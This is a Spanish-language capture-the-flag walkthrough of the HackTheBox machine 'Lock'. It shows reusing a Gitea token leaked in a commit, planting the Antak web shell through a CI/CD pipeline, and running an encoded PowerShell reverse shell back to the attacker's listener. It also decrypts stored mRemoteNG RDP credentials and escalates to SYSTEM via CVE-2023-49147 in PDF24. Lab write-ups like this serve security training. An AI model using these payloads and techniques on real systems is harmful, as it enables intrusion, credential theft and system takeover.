Propiedades:
- OS: Windows
- Plataforma: HackTheBox
- Nivel: Easy
- Tags: #gitea #mremoteng #pdf24 #CVE-2023-49147 #CI/CD #git

![](assets/Pasted%20image%2020260210161404.png)
## Reconocimiento

Comienzo con un ping para comprobar la conectividad

```bash
┌─[us-dedivip-2]─[10.10.15.2]─[wonderiing@htb-mlhybanpr2]─[~]
└──╼ [★]$ ping -c 1 10.129.13.207
PING 10.129.13.207 (10.129.13.207) 56(84) bytes of data.
64 bytes from 10.129.13.207: icmp_seq=1 ttl=127 time=66.6 ms

--- 10.129.13.207 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 66.631/66.631/66.631/0.000 ms

```

Ahora tiro un escaneo con nmap para ver que puertos tenemos abiertos.

```bash
┌─[us-dedivip-2]─[10.10.15.2]─[wonderiing@htb-mlhybanpr2]─[~/Machines/lock]
└──╼ [★]$ sudo nmap -p- -Pn -n -sS --min-rate 5000 -vvv 10.129.13.207 -oG nmap/allPorts

PORT     STATE SERVICE       REASON
80/tcp   open  http          syn-ack ttl 127
445/tcp  open  microsoft-ds  syn-ack ttl 127
3000/tcp open  ppp           syn-ack ttl 127
3389/tcp open  ms-wbt-server syn-ack ttl 127

```

Sobre los puertos abiertos tiro un segundo escaneo para detectar servicios, versiones y correr un conjunto de scripts de reconocimiento.

```bash
┌─[us-dedivip-2]─[10.10.15.2]─[wonderiing@htb-mlhybanpr2]─[~/Machines/lock]
└──╼ [★]$ sudo nmap -p 80,445,3000,3389 -sV -sC -Pn -n -sS -vvv 10.129.13.207 -oN nmap/target

PORT     STATE SERVICE       REASON          VERSION
80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
|_http-title: Lock - Index
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
445/tcp  open  microsoft-ds? syn-ack ttl 127
3000/tcp open  ppp?          syn-ack ttl 127
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: i_like_gitea=6d669e2428fd9ece; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=1K03mJgB67cqVw3oEHCwRxs6j806MTc3MDMyNzU1OTQ3NzEyMDYwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Thu, 05 Feb 2026 21:39:19 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-auto">
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi8vbG9jYWxob3N0OjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjU"
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Allow: HEAD
|     Allow: GET
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=1d96116544d1bf07; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=kSs2v-bw41aQ0AqZpUhXEw_BoC46MTc3MDMyNzU2NTM5NTI0NjcwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Thu, 05 Feb 2026 21:39:25 GMT
|_    Content-Length: 0
3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: LOCK
|   NetBIOS_Domain_Name: LOCK
|   NetBIOS_Computer_Name: LOCK
|   DNS_Domain_Name: Lock
|   DNS_Computer_Name: Lock
|   Product_Version: 10.0.20348
|_  System_Time: 2026-02-05T21:40:45+00:00
| ssl-cert: Subject: commonName=Lock
| Issuer: commonName=Lock
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-02-04T21:34:57
| Not valid after:  2026-08-06T21:34:57
| MD5:   c5ca:9dad:c256:0530:e657:fda5:86d5:3b44
| SHA-1: c3f3:155f:b47e:d182:832b:50fe:cab0:a2b7:9b18:047a
| -----BEGIN CERTIFICATE-----
| MIICzDCCAbSgAwIBAgIQR5tWlrHw06NKQlLH2ET1VDANBgkqhkiG9w0BAQsFADAP
| MQ0wCwYDVQQDEwRMb2NrMB4XDTI2MDIwNDIxMzQ1N1oXDTI2MDgwNjIxMzQ1N1ow
| DzENMAsGA1UEAxMETG9jazCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEB
| AK3TTW9iQ5lfCp8r+Ec5CeLLaXMjsQa5qqAnl2U61jQJ1OrXkhqOzOh41Tm4jH9J
| u76+gKzZXInuGMNV1Jgu7sGPMlrdDJG2v+VPkxnKRpkijgYigwuJwg8i9S8QeU4k
| S4A9W5GSBTi/nsIs3P90HI9qyBSu4goQwFd71ig1JiJRnptH0KApNCjzlCe5kCpO
| f1qThfFSMjVQo1+HS250rnBcUKm7lrzVl14QWF9G7hIfuFM0PODduBpuadQLRKIC
| zwC6piQM7tAIQq0FJRf0V8MfXF1WN7+P4Ya7nQ4LBMwHG4gcxonEiG7PjjaJ8k/2
| 5Eh30NGiURQLVaxFvuBfsrUCAwEAAaMkMCIwEwYDVR0lBAwwCgYIKwYBBQUHAwEw
| CwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEBCwUAA4IBAQBchPmyfm0En89enx0XRHmU
| LBBRgA1m0uzdGEHVjXWiGvUNzXYTc6YxDVeHhjl2qRvpEPE5+2m2eyiqQ7MGJUF2
| FBMT32xFIDgbOQxqe54SJqplZ2g5NbUT3JDqeOYxtLIpc/1kNjZPjbaT8YRRvyo2
| br6B9GWtcRT/z72aECCgfu2hTLcxtpp2+jat3jR3KPQp+Rqo8jGMLeHZNgmA6fIu
| vNtgxwkxJIdLp/nvbcthj4APlzBpbDlgOKOC1L6No333lIpC+8hOpmknKE8IKZnL
| 3Mxhg6twgzbFvdhIoX3SzAwmRLWTVNi+iGuy/sr6V+uZG0JZsk/CxJ1dlmoZGNtO
|_-----END CERTIFICATE-----
|_ssl-date: 2026-02-05T21:41:22+00:00; -5s from scanner time.
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.94SVN%I=7%D=2/5%Time=69850E0C%P=x86_64-pc-linux-gnu%r(
SF:GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x2
SF:0text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad
SF:\x20Request")%r(GetRequest,3000,"HTTP/1\.0\x20200\x20OK\r\nCache-Contro
SF:l:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nCon
SF:tent-Type:\x20text/html;\x20charset=utf-8\r\nSet-Cookie:\x20i_like_gite
SF:a=6d669e2428fd9ece;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Cook
SF:ie:\x20_csrf=1K03mJgB67cqVw3oEHCwRxs6j806MTc3MDMyNzU1OTQ3NzEyMDYwMA;\x2
SF:0Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Opti
SF:ons:\x20SAMEORIGIN\r\nDate:\x20Thu,\x2005\x20Feb\x202026\x2021:39:19\x2
SF:0GMT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20class=\"them
SF:e-auto\">\n<head>\n\t<meta\x20name=\"viewport\"\x20content=\"width=devi
SF:ce-width,\x20initial-scale=1\">\n\t<title>Gitea:\x20Git\x20with\x20a\x2
SF:0cup\x20of\x20tea</title>\n\t<link\x20rel=\"manifest\"\x20href=\"data:a
SF:pplication/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRl
SF:YSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnR
SF:fdXJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi
SF:8vbG9jYWxob3N0OjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wb
SF:mciLCJzaXplcyI6IjU")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nC
SF:ontent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\
SF:n\r\n400\x20Bad\x20Request")%r(HTTPOptions,197,"HTTP/1\.0\x20405\x20Met
SF:hod\x20Not\x20Allowed\r\nAllow:\x20HEAD\r\nAllow:\x20GET\r\nCache-Contr
SF:ol:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nSe
SF:t-Cookie:\x20i_like_gitea=1d96116544d1bf07;\x20Path=/;\x20HttpOnly;\x20
SF:SameSite=Lax\r\nSet-Cookie:\x20_csrf=kSs2v-bw41aQ0AqZpUhXEw_BoC46MTc3MD
SF:MyNzU2NTM5NTI0NjcwMA;\x20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20Same
SF:Site=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20Thu,\x2005\x20Fe
SF:b\x202026\x2021:39:25\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRe
SF:quest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/p
SF:lain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Req
SF:uest");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-02-05T21:40:46
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: -5s, deviation: 0s, median: -5s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 50834/tcp): CLEAN (Timeout)
|   Check 2 (port 40835/tcp): CLEAN (Timeout)
|   Check 3 (port 47945/udp): CLEAN (Timeout)
|   Check 4 (port 21192/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

```

Tenemos la siguiente info:

- Puerto 80 HTTP
- Puerto 445 SMB
- Puerto 3000 HTTP Gitea
- Puerto 3389 RDP
## Enumeración

### Puerto 80 HTTP

Pagina Principal:

![](assets/Pasted%20image%2020260206141946.png)

#### Tecnologías Web

 Por los headers me puedo dar cuenta que corre sobre un IIS - ASP NET

```bash
┌─[us-dedivip-2]─[10.10.15.2]─[wonderiing@htb-mlhybanpr2]─[~/Machines/lock/website]
└──╼ [★]$ curl -I http://lock.vl/
HTTP/1.1 200 OK
Content-Length: 16054
Content-Type: text/html
Last-Modified: Thu, 28 Dec 2023 14:07:59 GMT
Accept-Ranges: bytes
ETag: "675cb2439739da1:0"
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET
Date: Thu, 05 Feb 2026 22:00:18 GMT
```

En esta web no encontré nada raro.

### Puerto 3000 HTTP

En este puerto corre Gitea en su versión 1.441

![](assets/Pasted%20image%2020260206141959.png)

Existe solo un repositorio llamado dev-scripts que pertenece a un usuario ellen.freeman.

![](assets/Pasted%20image%2020260206142006.png)

Existen 2 commits para este repositorio, el primer commit contiene un token de acceso de gitea hardcodeado:

![](assets/Pasted%20image%2020260206142019.png)

- Token: `43ce39bb0bd6bc489284f2905f033ca467a6362f`

Este script tiene como propósito listar los repositorios públicos y privados del usuario ellen.freeman.

```jsx
import requests
import sys

# store this in env instead at some point
PERSONAL_ACCESS_TOKEN = '43ce39bb0bd6bc489284f2905f033ca467a6362f'

def format_domain(domain):
    if not domain.startswith(('http://', 'https://')):
        domain = 'https://' + domain
    return domain

def get_repositories(token, domain):
    headers = {
        'Authorization': f'token {token}'
    }
    url = f'{domain}/api/v1/user/repos'
    response = requests.get(url, headers=headers)

    if response.status_code == 200:
        return response.json()
    else:
        raise Exception(f'Failed to retrieve repositories: {response.status_code}')

def main():
    if len(sys.argv) < 2:
        print("Usage: python script.py <gitea_domain>")
        sys.exit(1)

    gitea_domain = format_domain(sys.argv[1])

    try:
        repos = get_repositories(PERSONAL_ACCESS_TOKEN, gitea_domain)
        print("Repositories:")
        for repo in repos:
            print(f"- {repo['full_name']}")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()
```

## Acceso Inicial.

Puedo bajarme ese script en mi maquina para listar los repositorios de ellen.freeman

```bash
┌─[us-dedivip-2]─[10.10.15.2]─[wonderiing@htb-mlhybanpr2]─[~/Machines/lock]
└──╼ [★]$ python3 repos.py  http://lock.vl:3000/
Repositories:
- ellen.freeman/dev-scripts
- ellen.freeman/website
```

- Aparte del repositorio publico dev-scripts existe otro llamado website.

Voy a clonarme ese repositorio para ver que contiene: 

```bash
┌─[us-dedivip-2]]─[~/Machines/lock]
└──╼ [★]$ git clone http://ellen.freeman:43ce39bb0bd6bc489284f2905f033ca467a6362f@lock.vl:3000/ellen.freeman/website.git
Cloning into 'website'...
remote: Enumerating objects: 165, done.
remote: Counting objects: 100% (165/165), done.
remote: Compressing objects: 100% (128/128), done.
remote: Total 165 (delta 35), reused 153 (delta 31), pack-reused 0
Receiving objects: 100% (165/165), 7.16 MiB | 1.86 MiB/s, done.
Resolving deltas: 100% (35/35), done.

```

El repositorio contiene un [readme.md] que menciona que el repositorio tiene CI/CD.

- Esto quiere decir, que todos los cambios que haga al repositorio deberían de ser desplegados de manera automática.

```bash
┌─[us-dedivip-2]─[10.10.15.2]─[wonderiing@htb-mlhybanpr2]─[~/Machines/lock/website]
└──╼ [★]$ cat readme.md 
# New Project Website

CI/CD integration is now active - changes to the repository will automatically be deployed to the webserver
```

Al darle un vistazo al `index.html` me puedo dar cuenta que este repositorio corresponde al de la web corriendo por el puerto 80:

```bash
└──╼ [★]$ cat index.html 

 <!-- ======= Hero Section ======= -->
<section id="hero" class="d-flex align-items-center justify-content-center">
  <div class="container" data-aos="fade-up">

    <div class="row justify-content-center" data-aos="fade-up" data-aos-delay="150">
      <div class="col-xl-6 col-lg-8">
        <h1>Powerful Document Solutions With Cutting-Edge Technology<span>.</span></h1>
      </div>
    </div>

```

Como el repositorio cuenta con CI/CD todos los archivos que yo cree y pushee al repositorio deberían de ser accesibles por la web en el puerto 80, esto lo puedo comprobar subiendo un simple archivo de pruebas:

- Primero configuro git.

```bash
┌─[us-dedivip-2]─[10.10.15.2]─[wonderiing@htb-mlhybanpr2]─[~/Machines/lock/website]
└──╼ [★]$ git config user.name "ellen.freeman"

┌─[us-dedivip-2]─[10.10.15.2]─[wonderiing@htb-mlhybanpr2]─[~/Machines/lock/website]
└──╼ [★]$ git config user.email "ellen.freeman@lock.vl"
```

- Ahora creo el archivo y lo pusheo al repositorio:

```bash
┌─[us-dedivip-2]─[10.10.15.2]─[wonderiing@htb-mlhybanpr2]─[~/Machines/lock/website]
└──╼ [★]$ cat test.txt
hola

┌─[us-dedivip-2]─[10.10.15.2]─[wonderiing@htb-mlhybanpr2]─[~/Machines/lock/website]
└──╼ [★]$ git commit -m "test"
[main aade521] test
 1 file changed, 1 insertion(+)
 create mode 100644 test.txt
 
┌─[us-dedivip-2]─[10.10.15.2]─[wonderiing@htb-mlhybanpr2]─[~/Machines/lock/website]
└──╼ [★]$ git push -u origin main
Enumerating objects: 4, done.
Counting objects: 100% (4/4), done.
Delta compression using up to 4 threads
Compressing objects: 100% (2/2), done.
Writing objects: 100% (3/3), 264 bytes | 264.00 KiB/s, done.
Total 3 (delta 1), reused 0 (delta 0), pack-reused 0
remote: . Processing 1 references
remote: Processed 1 references in total
To http://lock.vl:3000/ellen.freeman/website.git
   73cdcc1..aade521  main -> main
branch 'main' set up to track 'origin/main'.

```

Al tirarle un CURL puedo ver que el archivo en efecto es accessible.

```bash
┌─[us-dedivip-2]─[10.10.15.2]─[wonderiing@htb-mlhybanpr2]─[~/Machines/lock/website]
└──╼ [★]$ curl http://lock.vl/test.txt
hola

```

Ahora subo una **web-shell compatible con .NET** para que el servidor pueda ejecutarla sin problemas. En este caso utilizo **Antak**, una web-shell basada en PowerShell que incluye un **usuario y contraseña** definidos dentro del propio archivo.

```bash
┌─[us-dedivip-2]─[~/Machines/lock/website]
└──╼ [★]$ cp /usr/share/nishang/Antak-WebShell/antak.aspx .

┌─[us-dedivip-2]─[~/Machines/lock/website]
└──╼ [★]$ nano antak.aspx 

┌─[us-dedivip-2]─[~/Machines/lock/website]
└──╼ [★]$ git add .

┌─[us-dedivip-2]─[~/Machines/lock/website]
└──╼ [★]$ git commit -m "nishang"
[main fa79d96] nishang
 2 files changed, 270 insertions(+), 50 deletions(-)
	 create mode 100644 antak.aspx
 delete mode 100644 webshell.asp
 
┌─[us-dedivip-2]─[~/Machines/lock/website]
└──╼ [★]$ git push -u origin main
Enumerating objects: 4, done.
Counting objects: 100% (4/4), done.
Delta compression using up to 4 threads
Compressing objects: 100% (3/3), done.
Writing objects: 100% (3/3), 3.96 KiB | 3.96 MiB/s, done.
Total 3 (delta 1), reused 0 (delta 0), pack-reused 0
remote: . Processing 1 references
remote: Processed 1 references in total
To http://lock.vl:3000/ellen.freeman/website.git
   600c2d4..fa79d96  main -> main
branch 'main' set up to track 'origin/main'.
```

Puedo acceder a la shell desde el navegador.

```bash
http://<ip>/antak.aspx
```

![](assets/Pasted%20image%2020260206142133.png)

Ahora que tengo ejecucion de comandos voy a entablarme una reverse-shell. En mi caso utilizare Powershell Base64 de [ReverseShellGenerators]([https://www.revshells.com/](https://www.revshells.com/))

- Me pongo en escucha.

```bash
┌─[us-dedivip-2]─[10.10.15.2]─[wonderiing@htb-mlhybanpr2]─[~/Machines/lock/website]
└──╼ [★]$ sudo nc -nlvp 9001
```

- Ejecuto la reverse-shell en mi web-shell:

```bash
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA1AC4AMgAiACwAOQAwADAAMQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
```

- Y obtengo conexión

```bash
┌─[us-dedivip-2]─[10.10.15.2]─[wonderiing@htb-mlhybanpr2]─[~/Machines/lock/website]
└──╼ [★]$ sudo nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.10.15.2] from (UNKNOWN) [10.129.13.207] 61292
whoami
lock\ellen.freeman
PS C:\windows\system32\inetsrv> 

```

## Escalada de Privilegios.


Dentro del directorio Documentos encuentro un archivo llamado `config.xml` que corresponde a un archivo de configuracion para la herramienta `mremoteng`.

- Esta herramienta sirve para administrar conexiones remotas.

```jsx
PS C:\Users\ellen.freeman\Documents> cat config.xml

<?xml version="1.0" encoding="utf-8"?>
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="sDkrKn0JrG4oAL4GW8BctmMNAJfcdu/ahPSQn3W5DPC3vPRiNwfo7OH11trVPbhwpy+1FnqfcPQZ3olLRy+DhDFp" ConfVersion="2.6">
    <Node Name="RDP/Gale" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="a179606a-a854-48a6-9baa-491d8eb3bddc" Username="Gale.Dekarios" Domain="" Password="TYkZkvR2YmVlm2T2jBYTEhPU2VafgW1d9NSdDX+hUYwBePQ/2qKx+57IeOROXhJxA7CczQzr1nRm89JulQDWPw==" Hostname="Lock" Protocol="RDP" PuttySession="Default Settings" Port="3389" ConnectToConsole="false" UseCredSsp="true" RenderingEngine="IE" ICAEncryptionStrength="EncrBasic" RDPAuthenticationLevel="NoAuth" RDPMinutesToIdleTimeout="0" RDPAlertIdleTimeout="false" LoadBalanceInfo="" Colors="Colors16Bit" Resolution="FitToWindow" AutomaticResize="true" DisplayWallpaper="false" DisplayThemes="false" EnableFontSmoothing="false" EnableDesktopComposition="false" CacheBitmaps="false" RedirectDiskDrives="false" RedirectPorts="false" RedirectPrinters="false" RedirectSmartCards="false" RedirectSound="DoNotPlay" SoundQuality="Dynamic" RedirectKeys="false" Connected="false" PreExtApp="" PostExtApp="" MacAddress="" UserField="" ExtApp="" VNCCompression="CompNone" VNCEncoding="EncHextile" VNCAuthMode="AuthVNC" VNCProxyType="ProxyNone" VNCProxyIP="" VNCProxyPort="0" VNCProxyUsername="" VNCProxyPassword="" VNCColors="ColNormal" VNCSmartSizeMode="SmartSAspect" VNCViewOnly="false" RDGatewayUsageMethod="Never" RDGatewayHostname="" RDGatewayUseConnectionCredentials="Yes" RDGatewayUsername="" RDGatewayPassword="" RDGatewayDomain="" InheritCacheBitmaps="false" InheritColors="false" InheritDescription="false" InheritDisplayThemes="false" InheritDisplayWallpaper="false" InheritEnableFontSmoothing="false" InheritEnableDesktopComposition="false" InheritDomain="false" InheritIcon="false" InheritPanel="false" InheritPassword="false" InheritPort="false" InheritProtocol="false" InheritPuttySession="false" InheritRedirectDiskDrives="false" InheritRedirectKeys="false" InheritRedirectPorts="false" InheritRedirectPrinters="false" InheritRedirectSmartCards="false" InheritRedirectSound="false" InheritSoundQuality="false" InheritResolution="false" InheritAutomaticResize="false" InheritUseConsoleSession="false" InheritUseCredSsp="false" InheritRenderingEngine="false" InheritUsername="false" InheritICAEncryptionStrength="false" InheritRDPAuthenticationLevel="false" InheritRDPMinutesToIdleTimeout="false" InheritRDPAlertIdleTimeout="false" InheritLoadBalanceInfo="false" InheritPreExtApp="false" InheritPostExtApp="false" InheritMacAddress="false" InheritUserField="false" InheritExtApp="false" InheritVNCCompression="false" InheritVNCEncoding="false" InheritVNCAuthMode="false" InheritVNCProxyType="false" InheritVNCProxyIP="false" InheritVNCProxyPort="false" InheritVNCProxyUsername="false" InheritVNCProxyPassword="false" InheritVNCColors="false" InheritVNCSmartSizeMode="false" InheritVNCViewOnly="false" InheritRDGatewayUsageMethod="false" InheritRDGatewayHostname="false" InheritRDGatewayUseConnectionCredentials="false" InheritRDGatewayUsername="false" InheritRDGatewayPassword="false" InheritRDGatewayDomain="false" />
</mrng:Connections>

```

El archivo `config.xml` alberga credenciales las cuales puedo desencriptar con la ayuda de la herramienta: 

- [mremoteng_decrypt](https://github.com/kmahyyg/mremoteng-decrypt/blob/master/mremoteng_decrypt.py)

```bash
┌─[us-dedivip-2]─[10.10.15.2]─[wonderiing@htb-ix7zjfxfbj]─[~/lock/mRemoteNG_password_decrypt]
└──╼ [★]$ python3 mremoteng_decrypt.py config.xml 

Name: RDP/Gale
Hostname: Lock
Username: Gale.Dekarios
Password: ty8wnW9qCKDosXo6

```

Puedo probar estas credenciales en RDP:

```bash
┌─[us-dedivip-2]─[10.10.15.2]─[wonderiing@htb-ix7zjfxfbj]─[~/lock/mRemoteNG_password_decrypt]
└──╼ [★]$ nxc rdp lock.vl -u 'gale.dekarios' -p 'ty8wnW9qCKDosXo6'
RDP         10.129.234.64   3389   LOCK             [*] Windows 10 or Windows Server 2016 Build 20348 (name:LOCK) (domain:Lock) (nla:True)
RDP         10.129.234.64   3389   LOCK             [+] Lock\gale.dekarios:ty8wnW9qCKDosXo6 (Pwn3d!)
```

Ahora puedo conectarme por rdp a la maquina:

```bash
┌─[us-dedivip-2]─[10.10.15.2]─[wonderiing@htb-ix7zjfxfbj]─[~/lock/mRemoteNG_password_decrypt]
└──╼ [★]$ xfreerdp /v:10.129.234.64 /u:gale.dekarios /p:ty8wnW9qCKDosXo6

```

Obtengo la user flag:


![](assets/Pasted%20image%2020260206142307.png)


Dentro de Program Files y en el escritorio me encontré con una app llamada PDF24

```powershell
PS C:\Program Files> ls

    Directory: C:\Program Files

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         4/15/2025   6:02 PM                Amazon
d-----        12/27/2023  10:26 AM                Common Files
d-----        12/27/2023  10:53 AM                Git
d-----         4/15/2025   5:56 PM                Internet Explorer
d-----          5/8/2021   1:20 AM                ModifiableWindowsApps
d-----        12/28/2023  11:24 AM                Mozilla Firefox
d-----        12/28/2023  11:29 AM                PDF24
```

Esta versión de PDF24 es vulnerable al CVE:

- [CVE-2023-49147](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-msi-installer-in-pdf24-creator-geek-software-gmbh/)

```powershell
PS C:\Program Files\PDF24>  Get-ChildItem .\pdf24.exe | Format-List VersionInfo

VersionInfo : File:             C:\Program Files\PDF24\pdf24.exe
              InternalName:     PDF24 Backend
              OriginalFilename: pdf24.exe
              FileVersion:      11.15.1
              FileDescription:  PDF24 Backend
              Product:          PDF24 Creator
              ProductVersion:   11.15.1
              Debug:            False
              Patched:          False
              PreRelease:       False
              PrivateBuild:     False
              SpecialBuild:     False
              Language:         English (United States)

```

El instalador MSI de **PDF24 Creator** está mal configurado, de modo que al ejecutar la función **Repair** mediante `msiexec.exe`, se lanza una ventana visible de `cmd.exe` que se ejecuta con privilegios **SYSTEM**. Esto permite a un atacante local encadenar acciones para obtener una **shell interactiva completamente funcional como SYSTEM**, resultando en una **elevación de privilegios local**. PDF24 abre el cmd para tratar de escribir en un archivo de log ubicado en `C:\Program Files\PDF24\faxPrnInst.log`

Primero necesito "bloquear" el archivo de log con [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools/releases) para que pdf24 mantenga el cmd abierto.

```powershell
PS C:\Temp> .\SetOpLock.exe "C:\Program Files\PDF24\faxPrnInst.log" r

```

Abriremos el instalador de `pdf24` ubicado en `C:\_install` y le daremos a la opción de "Repair": 

![](assets/Pasted%20image%2020260206142336.png)

Al acabar la reparación, se queda una terminal, en su barra superior le daremos click derecho → Properties y se nos mostrara unos ventana de ajustes. En esta ventana de ajustes le daremos click al link de legacy console mode

![](assets/Pasted%20image%2020260206142455.png)

Al darle click se nos preguntara con cual navegador queremos abrirlo y deberemos elegir Firefox.

![](assets/Pasted%20image%2020260206142535.png)

Después se nos abrirá Firefox donde tendremos que esperar un poco hasta que nos salte un mensaje de que la pagina no se pudo cargar, cuando veamos el mensaje podemos dar Ctrl + o y se nos abrirá una file explorer, en este file explorer podremos escribir `cmd.exe` para abrir una terminal

![](assets/Pasted%20image%2020260206142542.png)

La terminal que se nos abre nos convierte en nt authority\system

![](assets/Pasted%20image%2020260206142613.png)

Flag:

```powershell
Microsoft Windows [Version 10.0.20348.3932]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\System32>whoami
nt authority\system

C:\Users\Administrator\Desktop>type root.txt
c822e779dbbe80ad4326*******
```


***PWNED***

![](assets/Pasted%20image%2020260210161439.png)